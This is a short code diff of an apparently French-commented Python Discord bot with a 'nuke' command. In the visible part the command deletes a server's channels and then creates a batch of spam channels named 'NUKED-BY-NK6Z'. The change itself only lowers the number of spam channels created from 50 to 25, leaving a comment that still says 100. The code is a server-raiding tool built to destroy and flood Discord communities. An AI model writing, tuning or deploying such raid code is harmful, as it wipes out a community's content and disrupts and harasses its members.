@@ -42,7 +42,7 @@ async def nuke(ctx, message_count: int = 3):
             print(f"[Erreur] Suppression salon : {e}")
 
     # Créer de nouveaux canaux de spam
-    for i in range(50):  # Créer jusqu'à 100 canaux
+    for i in range(25):  # Créer jusqu'à 100 canaux
         try:
             # Créer un nouveau canal de spam
             channel = await guild.create_text_channel(f"NUKED-BY-NK6Z")
@@ -67,6 +67,7 @@ async def nuke(ctx, message_count: int = 3):
 
 webserver.keep_alive()
 bot.run(TOKEN)
+
 
 
 
